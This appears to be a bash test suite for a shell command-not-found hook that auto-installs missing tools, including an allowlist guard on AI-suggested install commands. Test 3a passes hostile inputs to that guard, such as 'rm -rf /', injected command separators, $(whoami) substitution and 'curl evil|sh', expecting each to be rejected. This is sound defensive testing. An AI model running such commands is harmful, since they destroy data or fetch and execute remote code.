#!/usr/bin/env bash
# Test the command-not-found AI lazy-installer (home/dot_config/shell/not-found-hook.sh + home/dot_local/bin/executable_cnf-build-index).
# Hermetic + SAFE: exercises __cnf_resolve in CNF_DRY mode against a synthetic
# index (no real install, no machine mutation) and validates the index builder.
# Mirrors handler.sh's gum-or-printf output idiom so it runs in CI without gum.
# Part of the "aid" first-workflow slice — see docs/aid/CURRENT-STATE.md.
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
# Single canonical (chezmoi-deployed) locations — fire #3 folded provisioning/command-not-found/ here.
HANDLER="$ROOT/home/dot_config/shell/not-found-hook.sh"       # → ~/.config/shell/not-found-hook.sh
BUILDER="$ROOT/home/dot_local/bin/executable_cnf-build-index" # → ~/.local/bin/cnf-build-index

say(){  command -v gum >/dev/null 2>&1 && gum style --foreground 51  -- "$*" || printf '\033[1;36m%s\033[0m\n' "$*"; }
pass(){ command -v gum >/dev/null 2>&1 && gum style --foreground 46  -- "PASS $*" || printf '\033[1;32mPASS\033[0m %s\n' "$*"; PASS=$((PASS+1)); }
fail(){ command -v gum >/dev/null 2>&1 && gum style --foreground 196 -- "FAIL $*" || printf '\033[1;31mFAIL\033[0m %s\n' "$*"; FAIL=$((FAIL+1)); }
skip(){ command -v gum >/dev/null 2>&1 && gum style --foreground 214 -- "SKIP $*" || printf '\033[1;33mSKIP\033[0m %s\n' "$*"; }
PASS=0; FAIL=0

say "command-not-found test suite"

# 0. static syntax
bash -n "$HANDLER" && pass "not-found-hook.sh parses" || fail "not-found-hook.sh syntax error"
bash -n "$BUILDER" && pass "cnf-build-index parses" || fail "cnf-build-index syntax error"

# E10 (v2): the hook must NEVER eval model-generated text or replay a shell string. Grep CODE lines
# only (strip comments, which legitimately mention the word).
if grep -vE '^[[:space:]]*#' "$HANDLER" | grep -qE '\beval\b'; then fail "E10: 'eval' on a code line — model-text eval must be eliminated"; else pass "E10: no eval of model-generated commands in the hook"; fi

# Alpine (apk) support — Alpine is a supported fleet role (CLAUDE.md §2), so the lazy-installer (the prompt's
# "automatically install software on demand") MUST support its native package manager in ALL THREE places, or a
# missing command on Alpine can't auto-install via apk — only the language providers (brew/go/cargo/npm/pip/gem)
# would be tried. #268: apk was absent from __cnf_os detection, __cnf_pref preference, AND __cnf_do_install
# dispatch — the same supported-fleet-role gap class as #267 (Alpine was missing from the update-system cron).
apkmiss=""
grep -qE 'command -v apk' "$HANDLER" || apkmiss="$apkmiss os-detect"
grep -qE 'apk\) +echo "apk ' "$HANDLER" || apkmiss="$apkmiss pref"
grep -qE 'apk\) +sudo apk add' "$HANDLER" || apkmiss="$apkmiss install-dispatch"
# #274: the 4th place a manager must appear — the AI-fallback safety allowlist (__cnf_ai_safe). apk was in
# all 3 fns + the colmap (#268) but MISSING here, so a valid 'sudo apk add X' AI suggestion was REJECTED on
# Alpine (the ai_safe allowlist is the only line with 'pip3' → grep it, assert apk is on it).
grep -E 'pip3' "$HANDLER" | grep -qF 'apk' || apkmiss="$apkmiss ai-safe-allowlist"
[ -z "$apkmiss" ] \
  && pass "cnf hook supports Alpine apk in all 4 places (__cnf_os detect + __cnf_pref preference + __cnf_do_install dispatch + __cnf_ai_safe allowlist)" \
  || fail "cnf hook MISSING Alpine apk support ($apkmiss) — a missing command can't auto-install via apk on a supported Alpine fleet role"

# Dual-path builder PARITY (#280): cnf-build-index has TWO code paths — the primary yq|jq and the python3+pyyaml
# fallback — that MUST produce BYTE-IDENTICAL output on the real software.yml, else the TSV index (and thus WHICH
# manager the hook picks) differs by which path ran on a box. #278 locked the column ORDER structurally; this runs
# BOTH paths on the committed catalog + diffs the actual ROWS end-to-end. Skips if either toolchain is absent (can't
# compare → never a false fail). The python path is forced by restricting PATH to a dir with only python3 (yq/jq
# shadowed). Hermetic: reads the committed software.yml read-only, writes to mktemp temps, cleaned up.
SWY="$ROOT/software.yml"
if [ -f "$SWY" ] && command -v yq >/dev/null 2>&1 && command -v jq >/dev/null 2>&1 && command -v python3 >/dev/null 2>&1 && python3 -c 'import yaml' 2>/dev/null; then
  _dpj="$(mktemp)"; _dpp="$(mktemp)"; _dpbin="$(mktemp -d)"
  ln -s "$(command -v python3)" "$_dpbin/python3" 2>/dev/null
  bash "$BUILDER" "$SWY" "$_dpj" >/dev/null 2>&1                               # yq|jq path (both present)
  PATH="$_dpbin:/usr/bin:/bin" bash "$BUILDER" "$SWY" "$_dpp" >/dev/null 2>&1   # python3 path (yq/jq shadowed)
  if [ -s "$_dpj" ] && [ -s "$_dpp" ] && diff <(sort "$_dpj") <(sort "$_dpp") >/dev/null 2>&1; then
    pass "cnf-build-index yq|jq path == python3 path — BYTE-IDENTICAL TSV on the real software.yml ($(wc -l < "$_dpj" | tr -d ' ') rows; #280 dual-path parity)"
  else
    fail "cnf-build-index DUAL-PATH DIVERGENCE — yq|jq and python3 produce different TSV on the real software.yml (the index differs by which builder path runs on a box)"
  fi
  command rm -rf "$_dpbin" "$_dpj" "$_dpp" 2>/dev/null
else
  skip "builder dual-path parity (#280) — need yq+jq+python3+pyyaml + software.yml all present"
fi

# shellcheck source=/dev/null
. "$HANDLER"
# isolate the test shell from the handler's shell hooks — a missing/typo'd function in this
# harness must NOT trigger the real resolver (which would try to install something).
unset -f command_not_found_handler command_not_found_handle 2>/dev/null || true

# the rc entry point must exist (dot_zshrc/dot_bashrc source this file then call it)
if declare -F handle_command_not_found >/dev/null 2>&1; then pass "handle_command_not_found (rc entry point) defined"; else fail "handle_command_not_found missing — rc integration would break"; fi

# The rc handlers (dot_zshrc command_not_found_handler, dot_bashrc command_not_found_handle) must pass the FULL
# command line to handle_command_not_found, NOT just the command NAME. __cnf_resolve captures cmd then SHIFTS,
# re-running "cmd + remaining args" — it is DESIGNED to preserve the user's args (rg pattern → install rg → run
# `rg pattern`). Passing only the first positional drops every arg, so a lazy-installed command re-runs BARE
# (rg pattern → bare rg, pattern lost). The hook's own self-contained handlers already forward all args; the rc
# re-definitions must match. #273. (grep patterns single-quoted so the positional refs stay literal.)
RC_ROOT="$ROOT/home"
rcargbad=""
for rcf in dot_zshrc dot_bashrc; do
  grep -qF 'handle_command_not_found "$1"' "$RC_ROOT/$rcf" 2>/dev/null && rcargbad="$rcargbad $rcf(drops-args)"
done
if [ -z "$rcargbad" ] && grep -qF 'handle_command_not_found "$@"' "$RC_ROOT/dot_zshrc" 2>/dev/null && grep -qF 'handle_command_not_found "$@"' "$RC_ROOT/dot_bashrc" 2>/dev/null; then
  pass "rc handlers forward the FULL command line to handle_command_not_found — a lazy-installed cmd re-runs WITH its original args (not bare)"
else
  fail "rc handler forwards only the command NAME (drops the user's args — a lazy-installed 'rg pattern' re-runs as bare 'rg'):$rcargbad"
fi

# 1. dry-run resolve against a synthetic index (proves lookup + manager selection; NO install)
tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
idx="$tmp/index.tsv"
# pick a package manager that actually exists on this runner; capture its TSV column.
# columns: 1 bin 2 key 3 brew 4 apt 5 dnf 6 pacman 7 cask 8 choco 9 scoop 10 go 11 cargo 12 npm 13 pipx 14 pip 15 gem
mgr=""; col=0
for cand in "brew:3" "go:10" "cargo:11" "npm:12" "pip:14" "gem:15"; do
  name="${cand%%:*}"; c="${cand##*:}"
  if command -v "$name" >/dev/null 2>&1; then mgr="$name"; col="$c"; break; fi
done
if [ -n "$mgr" ]; then
  row=(testtool testtool "" "" "" "" "" "" "" "" "" "" "" "" "")  # 15 fields, all installers empty
  row[$((col-1))]="testtool-pkg"                                   # fill only the detected manager's column
  ( IFS=$'\t'; printf '%s\n' "${row[*]}" ) > "$idx"
  out="$(CNF_INDEX="$idx" CNF_DRY=1 __cnf_resolve testtool 2>&1)"; rc=$?
  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q "\[CNF_DRY\] would install via $mgr: testtool-pkg"; then
    pass "dry-run resolves testtool -> $mgr: testtool-pkg (no install performed)"
  else
    fail "dry-run resolve (rc=$rc) :: $out"
  fi
else
  skip "no supported package manager on runner — dry-run resolve skipped"
fi

# 2. index builder end-to-end (needs yq+jq OR python3+pyyaml)
SW="$ROOT/software.yml"
built="$tmp/built.tsv"
if { command -v yq >/dev/null 2>&1 && command -v jq >/dev/null 2>&1; } || python3 -c 'import yaml' 2>/dev/null; then
  if bash "$BUILDER" "$SW" "$built" >/dev/null 2>&1; then
    lines="$(wc -l < "$built" | tr -d ' ')"
    if [ -s "$built" ] && [ "${lines:-0}" -gt 100 ]; then
      pass "build-index.sh produced $lines binary rows from software.yml"
    else
      fail "build-index.sh index too small ($lines rows)"
    fi
  else
    fail "build-index.sh exited non-zero"
  fi
else
  skip "no yq+jq or python3+pyyaml — index builder test skipped"
fi

# R09: mutable Go references are executable authority. The index must omit
# them, and the resolver independently refuses a planted mutable row.
cat > "$tmp/go-authority.yml" <<'YAML'
softwarePackages:
  moving:
    _bin: moving
    go: example.invalid/moving@latest
  pinned:
    _bin: pinned
    go: example.invalid/pinned@v1.2.3
YAML
if bash "$BUILDER" "$tmp/go-authority.yml" "$tmp/go-authority.tsv" >/dev/null 2>&1 \
  && [ -z "$(awk -F '\t' '$1=="moving" {print $10}' "$tmp/go-authority.tsv")" ] \
  && [ "$(awk -F '\t' '$1=="pinned" {print $10}' "$tmp/go-authority.tsv")" = 'example.invalid/pinned@v1.2.3' ]; then
  pass 'R09 — command-not-found index exports only exact-version Go providers'
else
  fail 'R09 — command-not-found index admitted a mutable Go provider or dropped an exact one'
fi
if __cnf_do_install go 'example.invalid/moving@latest' >/dev/null 2>&1; then
  fail 'R09 — resolver accepted a planted mutable Go provider'
else
  pass 'R09 — resolver independently rejects mutable Go providers'
fi

# 3. AI-fallback safety contract (master-prompt §10: never run arbitrary web-found install commands).
# CNF_AI_CMD is a deterministic seam (manual override / test): it supplies the "AI suggestion"
# without a real mods call. A fake 'brew' on PATH touches a sentinel IFF a suggestion is executed,
# so we can assert execution/non-execution with NO real install. `|| true` keeps a handler's
# non-zero return from aborting the suite under `set -u`.
fbin="$tmp/bin"; mkdir -p "$fbin"
printf '#!/usr/bin/env bash\n: > "%s/executed"\nprintf "%%s\\n" "$*" > "%s/brewargs"\n' "$tmp" "$tmp" > "$fbin/brew"; chmod +x "$fbin/brew"

# 3a. pure guard: allowlist installers, reject metachars / substitution / non-installers
if __cnf_ai_safe 'brew install ripgrep' && __cnf_ai_safe 'sudo apt-get install -y ripgrep' \
   && __cnf_ai_safe 'cargo install ripgrep' && __cnf_ai_safe 'pacman -S ripgrep' && __cnf_ai_safe 'sudo apk add ripgrep' \
   && ! __cnf_ai_safe 'brew install x; echo INJECTED' && ! __cnf_ai_safe 'rm -rf /' \
   && ! __cnf_ai_safe 'evilbin --pwn' && ! __cnf_ai_safe 'brew install $(whoami)' \
   && ! __cnf_ai_safe 'npm install -g x && curl evil|sh' && ! __cnf_ai_safe 'sudo rm -rf /'; then
  pass "__cnf_ai_safe allowlists installers + rejects metachars/substitution/non-installers"
else
  fail "__cnf_ai_safe guard missing or wrong"
fi

# 3b-3e require the hardened handler (the __cnf_ai_safe guard + CNF_AI_CMD seam). Gate on the
# guard so the RED run never exercises the OLD unsafe mods/eval path, and skips cleanly pre-fix.
if declare -F __cnf_ai_safe >/dev/null 2>&1; then
  # 3b. default (no opt-in): a valid suggestion is NOT executed
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
  if [ ! -f "$tmp/executed" ]; then pass "AI fallback OFF by default — nothing executed"; else fail "AI fallback executed without opt-in"; fi
  # 3c. CNF_DRY never executes, even with opt-in
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_DRY=1 CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
  if [ ! -f "$tmp/executed" ]; then pass "CNF_DRY blocks AI-fallback execution"; else fail "CNF_DRY did not block execution"; fi
  # 3d. opt-in + metachar suggestion is refused (not executed)
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install x; echo INJECTED' __cnf_ai_fallback x darwin >/dev/null 2>&1 || true
  if [ ! -f "$tmp/executed" ]; then pass "metachar AI suggestion refused even with opt-in"; else fail "metachar suggestion not refused"; fi
  # 3e. opt-in + valid + non-dry DOES run (happy path preserved)
  rm -f "$tmp/executed"
  PATH="$fbin:$PATH" CNF_AI_AUTOINSTALL=1 CNF_AI_CMD='brew install testpkg' __cnf_ai_fallback testpkg darwin >/dev/null 2>&1 || true
  if [ -f "$tmp/executed" ]; then pass "explicit opt-in runs a validated installer"; else fail "opt-in happy path did not execute"; fi
  # 3f. argv boundaries preserved via argv-exec (E07/E10): the installer got SEPARATE args, not a string
  if [ "$(cat "$tmp/brewargs" 2>/dev/null)" = "install testpkg" ]; then pass "argv-exec preserves boundaries (brew received 'install testpkg', no eval/string-replay)"; else fail "argv boundaries wrong: '$(cat "$tmp/brewargs" 2>/dev/null)'"; fi
else
  skip "AI-fallback behavior (3b-3e) — handler not hardened yet (__cnf_ai_safe absent)"
fi

# 4. provision wiring: a chezmoi run_after script (re)builds the index via the deployed builder on
# every `chezmoi apply` (apply is how software.yml changes reach a box). CNF_BUILD_INDEX_BIN is the
# test/override seam. Fake builder touches a sentinel so we can assert it was invoked (no real build).
WIRING="$ROOT/home/.chezmoiscripts/universal/run_after_22-cnf-index.sh.tmpl"
if [ -f "$WIRING" ]; then
  bash -n "$WIRING" && pass "run_after cnf-index wiring parses" || fail "run_after cnf-index syntax error"
  rm -f "$tmp/built-by-wiring"
  printf '#!/usr/bin/env bash\n: > "%s/built-by-wiring"\n' "$tmp" > "$fbin/fake-cnf-build-index"; chmod +x "$fbin/fake-cnf-build-index"
  CNF_BUILD_INDEX_BIN="$fbin/fake-cnf-build-index" bash "$WIRING" >/dev/null 2>&1 || true
  if [ -f "$tmp/built-by-wiring" ]; then pass "run_after wiring invokes the index builder"; else fail "run_after wiring did not invoke the builder"; fi
else
  fail "provision wiring script missing: home/.chezmoiscripts/universal/run_after_22-cnf-index.sh.tmpl"
fi

# 5. E11 recursion guard — a re-entry for the SAME cmd returns 127 without resolving (no infinite loop)
out5="$(__CNF_RESOLVING='reentrant' CNF_INDEX=/dev/null __cnf_resolve reentrant 2>&1)"; rc5=$?
[ "$rc5" -eq 127 ] && pass "E11 recursion guard — same-cmd re-entry -> 127 (no loop, no resolve)" || fail "recursion guard rc=$rc5 :: $out5"

# 6. E11 concurrency — two shells missing the SAME tool produce EXACTLY ONE install (lockdir serialized).
# Fake brew counts installs, sleeps so the peer overlaps, then creates 'footool' on PATH so the peer
# (and the race-after-release path) detect it and skip. Hermetic: tmp PATH + tmp index + tmp lock dir.
cbin="$tmp/cbin"; mkdir -p "$cbin"
fooidx="$tmp/fooidx.tsv"; printf 'footool\tfootool\tfootool\n' > "$fooidx"
printf '#!/usr/bin/env bash\necho 1 >> "%s/installcount"\nsleep 2\nprintf "#!/usr/bin/env bash\\necho ran\\n" > "%s/footool"\nchmod +x "%s/footool"\n' "$tmp" "$cbin" "$cbin" > "$cbin/brew"; chmod +x "$cbin/brew"
rm -f "$tmp/installcount" "$cbin/footool"
# CNF_ALLOW_NONINTERACTIVE=1 — these subshells are non-interactive (E13); simulate an APPROVED install.
( PATH="$cbin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$fooidx" CNF_LOCK_DIR="$tmp/locks" __cnf_resolve footool >/dev/null 2>&1 ) &
( PATH="$cbin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$fooidx" CNF_LOCK_DIR="$tmp/locks" __cnf_resolve footool >/dev/null 2>&1 ) &
wait
ic="$(grep -c . "$tmp/installcount" 2>/dev/null || echo 0)"
[ "$ic" = "1" ] && pass "E11 concurrency — 2 shells missing footool -> exactly ONE install (lock serialized)" || fail "E11 concurrency installs=$ic (want 1)"

# A live owner identity outranks lock age: even an apparently old lock must never be reaped while its
# exact PID/start identity is still alive.
CNF_LOCK_DIR="$tmp/live-owner-locks" CNF_LOCK_WAIT=0 CNF_LOCK_STALE=0
__CNF_LOCK_RESULT=""; __cnf_acquire neverinstalled; live_first=$?; live_lock="$__CNF_LOCK_RESULT"
sleep 1
__CNF_LOCK_RESULT=""; __cnf_acquire neverinstalled; live_second=$?
__cnf_release_install_lock "$live_lock" >/dev/null 2>&1 || true
if [ "$live_first" -eq 0 ] && [ "$live_second" -eq 11 ]; then
  pass "E11 — stale-age heuristic never reaps an exact live install-lock owner"
else
  fail "live install owner was reaped or reacquired first=$live_first second=$live_second"
fi

# A bounded lock wait must fail honestly instead of starting a second package-manager mutation.
timeout_bin="$tmp/timeout-bin"; timeout_locks="$tmp/timeout-locks"; mkdir -p "$timeout_bin" "$timeout_locks/timeouttool.lock"
timeout_idx="$tmp/timeout.tsv"; printf 'timeouttool\ttimeouttool\ttimeouttool\n' > "$timeout_idx"
printf '#!/usr/bin/env bash\n: > "%s/timeout-brew-ran"\n' "$tmp" > "$timeout_bin/brew"; chmod +x "$timeout_bin/brew"
rm -f "$tmp/timeout-brew-ran"
CNF_LOCK_WAIT=0 CNF_LOCK_STALE=999999 CNF_ALLOW_NONINTERACTIVE=1 PATH="$timeout_bin:$PATH" CNF_INDEX="$timeout_idx" CNF_LOCK_DIR="$timeout_locks" __cnf_resolve timeouttool >/dev/null 2>&1; timeout_rc=$?
{ [ "$timeout_rc" -eq 75 ] && [ ! -f "$tmp/timeout-brew-ran" ]; } && pass "E11 concurrency timeout -> bounded retry result, no duplicate install" || fail "E11 timeout rc=$timeout_rc duplicate=$([ -f "$tmp/timeout-brew-ran" ] && echo yes || echo no)"

# 7. E09/E08 — installer progress + hook status go to STDERR; a resolved command's STDOUT stays CLEAN.
# Fake brew prints noise to STDOUT then installs 'cleantool' (which echoes a sentinel). Capturing the
# resolve's stdout (2>/dev/null) must yield ONLY the sentinel — no install chatter.
ebin="$tmp/ebin"; mkdir -p "$ebin"
e9idx="$tmp/e9idx.tsv"; printf 'cleantool\tcleantool\tcleantool\n' > "$e9idx"
printf '#!/usr/bin/env bash\necho BREW_STDOUT_NOISE\nprintf "#!/usr/bin/env bash\\necho CLEAN_OUTPUT_42\\n" > "%s/cleantool"\nchmod +x "%s/cleantool"\n' "$ebin" "$ebin" > "$ebin/brew"; chmod +x "$ebin/brew"
rm -f "$ebin/cleantool"
e9out="$(PATH="$ebin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$e9idx" CNF_LOCK_DIR="$tmp/e9locks" __cnf_resolve cleantool 2>/dev/null)"
[ "$e9out" = "CLEAN_OUTPUT_42" ] && pass "E09/E08 — resolved command stdout is CLEAN (installer+hook noise on stderr)" || fail "E09 stdout polluted: '$e9out'"

# 8. E13/E14 — a NON-INTERACTIVE shell (CI/script/background/untrusted-project command) must NOT
# auto-install on a miss without an explicit opt-in: it returns ordinary not-found (127) and touches
# NO installer. The test shell is non-interactive, so a bare resolve (no opt-in, no CNF_DRY) must not
# run the fake brew. Then the SAME miss WITH CNF_ALLOW_NONINTERACTIVE=1 (aid exec/prewarm) DOES install.
nbin="$tmp/nbin"; mkdir -p "$nbin"
n8idx="$tmp/n8idx.tsv"; printf 'noauto\tnoauto\tnoauto\n' > "$n8idx"
printf '#!/usr/bin/env bash\n: > "%s/n8installed"\n' "$tmp" > "$nbin/brew"; chmod +x "$nbin/brew"
rm -f "$tmp/n8installed" "$nbin/noauto"
n8out="$(PATH="$nbin:$PATH" CNF_INDEX="$n8idx" CNF_LOCK_DIR="$tmp/n8locks" __cnf_resolve noauto 2>/dev/null)"; n8rc=$?
if [ "$n8rc" -eq 127 ] && [ ! -f "$tmp/n8installed" ]; then
  pass "E13/E14 — non-interactive miss w/o opt-in -> 127, no install (unauthorized install blocked)"
else
  fail "E13 non-interactive guard rc=$n8rc installed=$([ -f "$tmp/n8installed" ] && echo yes || echo no)"
fi
# 8b. the SAME miss WITH the explicit opt-in installs (approved aid exec / prewarming path).
rm -f "$tmp/n8installed"
printf '#!/usr/bin/env bash\n: > "%s/n8installed"\nprintf "#!/usr/bin/env bash\\necho ok\\n" > "%s/noauto"\nchmod +x "%s/noauto"\n' "$tmp" "$nbin" "$nbin" > "$nbin/brew"; chmod +x "$nbin/brew"
CNF_ALLOW_NONINTERACTIVE=1 PATH="$nbin:$PATH" CNF_INDEX="$n8idx" CNF_LOCK_DIR="$tmp/n8locks2" __cnf_resolve noauto >/dev/null 2>&1 || true
[ -f "$tmp/n8installed" ] && pass "E13 — CNF_ALLOW_NONINTERACTIVE opt-in permits install (aid exec/prewarm)" || fail "E13 opt-in did not permit install"

# 8c. Explicit policy boundaries refuse before touching a package manager and provide actionable remediation.
rm -f "$tmp/n8installed"
offline_msg="$(CNF_OFFLINE=1 CNF_ALLOW_NONINTERACTIVE=1 PATH="$nbin:$PATH" CNF_INDEX="$n8idx" __cnf_resolve noauto 2>&1 >/dev/null)"; offline_rc=$?
if [ "$offline_rc" -eq 69 ] && [ ! -f "$tmp/n8installed" ] && printf '%s' "$offline_msg" | grep -q 'signed offline bundle'; then
  pass "L05 — offline first invocation fails before install with exact bundle remediation"
else
  fail "offline guard rc=$offline_rc installed=$([ -f "$tmp/n8installed" ] && echo yes || echo no) msg=$offline_msg"
fi
disabled_msg="$(CNF_DISABLE=1 CNF_ALLOW_NONINTERACTIVE=1 PATH="$nbin:$PATH" CNF_INDEX="$n8idx" __cnf_resolve noauto 2>&1 >/dev/null)"; disabled_rc=$?
if [ "$disabled_rc" -eq 127 ] && printf '%s' "$disabled_msg" | grep -q 'select.*desired state'; then
  pass "L05 — policy-disabled invocation fails with desired-state remediation"
else
  fail "policy-disabled guard rc=$disabled_rc msg=$disabled_msg"
fi
privileged_result="$( ( __cnf_effective_uid(){ printf '0'; }; CNF_ALLOW_NONINTERACTIVE=1 PATH="$nbin:$PATH" CNF_INDEX="$n8idx" __cnf_resolve noauto ) 2>&1 >/dev/null)"; privileged_rc=$?
if [ "$privileged_rc" -eq 77 ] && printf '%s' "$privileged_result" | grep -q 'enrolled install user'; then
  pass "L05 — privileged first invocation refuses with least-privilege remediation"
else
  fail "privileged guard rc=$privileged_rc msg=$privileged_result"
fi

# 9. D13/B07 — the index build is ATOMIC + fail-soft: a FAILED/empty rebuild must NOT clobber a good
# index. Write a 3-row "good" index, then rebuild from a BROKEN source into the SAME path; the good
# index must survive intact. The old direct `> $OUT` write truncates it to 0 bytes before the parser
# even runs (RED); the temp-file + atomic-rename build leaves the previous good index untouched (GREEN).
atmp="$tmp/atomic"; mkdir -p "$atmp"
goodidx="$atmp/index.tsv"
printf 'a\ta\ta\nb\tb\tb\nc\tc\tc\n' > "$goodidx"
before="$(wc -l < "$goodidx" | tr -d ' ')"
badsrc="$atmp/broken.yml"; printf 'softwarePackages:\n  foo: {unclosed flow\n' > "$badsrc"
bash "$BUILDER" "$badsrc" "$goodidx" >/dev/null 2>&1 || true   # expected to fail (parse error OR 0-row guard)
after="$(wc -l < "$goodidx" 2>/dev/null | tr -d ' ')"
{ [ "$after" = "$before" ] && [ -s "$goodidx" ]; } && pass "D13/B07 — failed rebuild preserves the good index (atomic temp+rename, fail-soft: $before rows intact)" || fail "D13 non-atomic: index clobbered by failed build (before=$before after=$after)"

# 10. E04 primitive — CNF_NO_EXEC INSTALLS but does NOT re-run the command (the install-only mode the
# fish adapter delegates to; bash can't re-run into fish). Fake brew installs 'nxtool'; nxtool, IF RUN,
# would touch a sentinel — under CNF_NO_EXEC it must NOT be executed, yet the resolver returns 0 because
# the binary is now present. (RED on the old code, which always exec'd the installed command.)
nxbin="$tmp/nxbin"; mkdir -p "$nxbin"
nxidx="$tmp/nxidx.tsv"; printf 'nxtool\tnxtool\tnxtool\n' > "$nxidx"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\n: > \\"%s/nxran\\"\\n" > "%s/nxtool"\nchmod +x "%s/nxtool"\n' "$tmp" "$nxbin" "$nxbin" > "$nxbin/brew"; chmod +x "$nxbin/brew"
rm -f "$nxbin/nxtool" "$tmp/nxran"
CNF_NO_EXEC=1 CNF_ALLOW_NONINTERACTIVE=1 PATH="$nxbin:$PATH" CNF_INDEX="$nxidx" CNF_LOCK_DIR="$tmp/nxlocks" __cnf_resolve nxtool >/dev/null 2>&1; nxrc=$?
{ [ "$nxrc" -eq 0 ] && [ -x "$nxbin/nxtool" ] && [ ! -f "$tmp/nxran" ]; } && pass "E04 primitive — CNF_NO_EXEC installs but does NOT re-run (rc=0, binary present, never executed)" || fail "CNF_NO_EXEC rc=$nxrc installed=$([ -x "$nxbin/nxtool" ] && echo y || echo n) ran=$([ -f "$tmp/nxran" ] && echo y || echo n)"

# 11. E02 (ADR 0003) — DEFER to mise for a mise-provided command (don't duplicate mise's lazy machinery
# with a redundant system install). Fake `mise`: `mise which mtool` succeeds; `mise exec -- mtool` runs a
# sentinel + exits 7. mtool is ALSO in the index, so a fake `brew` would install it IF the hook fell
# through — it must NOT: the resolve runs via mise (sentinel + status 7) and never invokes brew.
mbin="$tmp/mbin"; mkdir -p "$mbin"
midx="$tmp/midx.tsv"; printf 'mtool\tmtool\tmtool\n' > "$midx"
printf '#!/usr/bin/env bash\ncase "$1" in\n  which) [ "$2" = mtool ] && exit 0 || exit 1;;\n  exec) shift; [ "$1" = -- ] && shift; if [ "$1" = mtool ]; then echo MISE_RAN_MTOOL; exit 7; fi;;\nesac\nexit 1\n' > "$mbin/mise"; chmod +x "$mbin/mise"
printf '#!/usr/bin/env bash\n: > "%s/brew_ran"\n' "$tmp" > "$mbin/brew"; chmod +x "$mbin/brew"
rm -f "$tmp/brew_ran"
mout="$(CNF_ALLOW_NONINTERACTIVE=1 PATH="$mbin:$PATH" CNF_INDEX="$midx" CNF_LOCK_DIR="$tmp/mlocks" __cnf_resolve mtool 2>/dev/null)"; mrc=$?
{ [ "$mout" = "MISE_RAN_MTOOL" ] && [ "$mrc" -eq 7 ] && [ ! -f "$tmp/brew_ran" ]; } && pass "E02 — mise-provided command runs via mise (status preserved), brew never invoked (no duplicate install)" || fail "E02 mise defer: out='$mout' rc=$mrc brew_ran=$([ -f "$tmp/brew_ran" ] && echo y || echo n)"
# 11b. a command mise does NOT provide falls through to the normal install path (fake brew installs it).
rm -f "$tmp/brew_ran" "$mbin/othertool"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\necho OTHER_OK\\n" > "%s/othertool"\nchmod +x "%s/othertool"\n: > "%s/brew_ran"\n' "$mbin" "$mbin" "$tmp" > "$mbin/brew"; chmod +x "$mbin/brew"
oidx="$tmp/oidx.tsv"; printf 'othertool\tothertool\tothertool\n' > "$oidx"
oout="$(CNF_ALLOW_NONINTERACTIVE=1 PATH="$mbin:$PATH" CNF_INDEX="$oidx" CNF_LOCK_DIR="$tmp/mlocks2" __cnf_resolve othertool 2>/dev/null)"
{ [ "$oout" = "OTHER_OK" ] && [ -f "$tmp/brew_ran" ]; } && pass "E02 — a non-mise command falls through to the normal install path (brew)" || fail "E02 fallthrough: out='$oout' brew_ran=$([ -f "$tmp/brew_ran" ] && echo y || echo n)"

# 12. U09/U10 — lazy-install TELEMETRY: a successful install appends a well-formed NDJSON line to the
# LOCAL journal (cmd/manager/pkg/outcome/duration_ms). No secrets, append-only. jq-validated.
jbin="$tmp/jbin"; mkdir -p "$jbin"
jidx="$tmp/jidx.tsv"; printf 'jtool\tjtool\tjtool\n' > "$jidx"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\necho ok\\n" > "%s/jtool"\nchmod +x "%s/jtool"\n' "$jbin" "$jbin" > "$jbin/brew"; chmod +x "$jbin/brew"
jlog="$tmp/installs.ndjson"; rm -f "$jlog" "$jbin/jtool"
CNF_JOURNAL="$jlog" CNF_ALLOW_NONINTERACTIVE=1 PATH="$jbin:$PATH" CNF_INDEX="$jidx" CNF_LOCK_DIR="$tmp/jlocks" __cnf_resolve jtool >/dev/null 2>&1
if [ -s "$jlog" ] && command -v jq >/dev/null 2>&1; then
  tail -1 "$jlog" | jq -e '.cmd=="jtool" and .mgr=="brew" and .pkg=="jtool" and .outcome=="installed" and (.duration_ms|type=="number")' >/dev/null 2>&1 && pass "U09/U10 — install appends a well-formed telemetry line (cmd/mgr/pkg/outcome/duration_ms)" || fail "journal line malformed: $(tail -1 "$jlog")"
elif [ -s "$jlog" ]; then
  { grep -q '"outcome":"installed"' "$jlog" && grep -q '"cmd":"jtool"' "$jlog"; } && pass "U09/U10 — install appends a telemetry line (jq absent; grep-validated)" || fail "journal line: $(tail -1 "$jlog")"
else
  fail "U09/U10 journal not written to $jlog"
fi
# 12b. V01 — sourcing the hook writes NO journal (telemetry is install-time only; startup stays
# side-effect + network free). A fresh journal path must stay absent after a bare source.
jlog2="$tmp/startup.ndjson"; rm -f "$jlog2"
( CNF_JOURNAL="$jlog2"; . "$HANDLER" ) >/dev/null 2>&1
[ ! -f "$jlog2" ] && pass "V01 — sourcing the hook writes no journal (startup side-effect-free)" || fail "sourcing wrote a journal: $(cat "$jlog2" 2>/dev/null)"

# 13. D03/E07 — array installer values install as SEPARATE args. software.yml allows a manager to take an
# ARRAY of packages (docker.apt = [containerd.io, docker-ce, docker-ce-cli, docker-compose-plugin]); the
# index space-JOINS them into one column. __cnf_do_install must word-split that back into N argv, not pass
# one quoted "a b c" (which apt/brew try to install as a single, unfindable package → the 61 array entries'
# lazy-install broken). Fake brew records each arg on its OWN line so we count SEPARATE args, not $* (which
# joins + hides the bug). RED on the old quoted-"$pkg"; GREEN once split to argv.
mabin="$tmp/mabin"; mkdir -p "$mabin"
